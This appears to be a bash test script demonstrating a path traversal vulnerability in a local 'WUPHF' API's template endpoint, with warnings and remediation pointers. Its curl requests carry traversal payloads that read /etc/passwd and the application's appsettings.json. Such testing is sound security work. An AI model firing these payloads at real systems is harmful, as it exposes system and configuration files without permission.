#!/bin/bash

# WUPHF API Path Traversal Vulnerability Test Script
# This script demonstrates the path traversal vulnerability in the /api/wuphf/template endpoint
# FOR EDUCATIONAL AND TESTING PURPOSES ONLY

API_URL="http://localhost:5043"
ENDPOINT="/api/wuphf/template"

echo "üêï WUPHF API Path Traversal Vulnerability Test"
echo "================================================"
echo ""
echo "‚ö†Ô∏è  WARNING: This script tests security vulnerabilities"
echo "    Only run against systems you own or have permission to test"
echo ""

# Function to test an endpoint
test_endpoint() {
    local description=$1
    local path=$2
    
    echo "Test: $description"
    echo "Path: $path"
    echo "---"
    
    response=$(curl -s "${API_URL}${ENDPOINT}?path=${path}" 2>&1)
    
    if [ $? -eq 0 ]; then
        echo "Response received (truncated):"
        echo "$response" | head -c 500
        echo ""
        echo "..."
    else
        echo "Error: Could not connect to API"
        echo "Make sure the WUPHF API is running on $API_URL"
    fi
    
    echo ""
    echo "================================================"
    echo ""
}

# Check if API is running
echo "Checking if WUPHF API is running..."
health_check=$(curl -s "${API_URL}/api/wuphf/health" 2>&1)
if [ $? -ne 0 ]; then
    echo "‚ùå Error: Cannot connect to WUPHF API at $API_URL"
    echo ""
    echo "Please start the API first:"
    echo "  cd src/WUPHF.Api"
    echo "  dotnet run"
    echo ""
    exit 1
fi

echo "‚úÖ API is running"
echo ""
echo "================================================"
echo ""

# Test 1: Legitimate use case
test_endpoint "Legitimate template access" \
    "templates/birthday.txt"

# Test 2: Path traversal - reading /etc/passwd (Linux)
test_endpoint "Path Traversal Attack - /etc/passwd (Linux)" \
    "/etc/passwd"

# Test 3: Path traversal - reading project files
test_endpoint "Path Traversal Attack - Reading appsettings.json" \
    "appsettings.json"

# Test 4: Relative path traversal
test_endpoint "Relative Path Traversal Attack" \
    "../../../../../../etc/passwd"

# Test 5: Reading the README file
test_endpoint "Path Traversal Attack - Reading README.md" \
    "../../../README.md"

echo "================================================"
echo "Test Complete"
echo ""
echo "üìä Summary:"
echo "  - If you can see file contents in the responses above,"
echo "    the path traversal vulnerability is confirmed"
echo ""
echo "üîí Remediation:"
echo "  - See SECURITY_VULNERABILITY_REPORT.md for fix details"
echo "  - Implement proper path validation and sanitization"
echo "  - Restrict file access to allowed directories only"
echo ""
echo "‚ö†Ô∏è  Remember: This is for educational purposes only!"
echo "    Never exploit vulnerabilities without permission."
echo ""
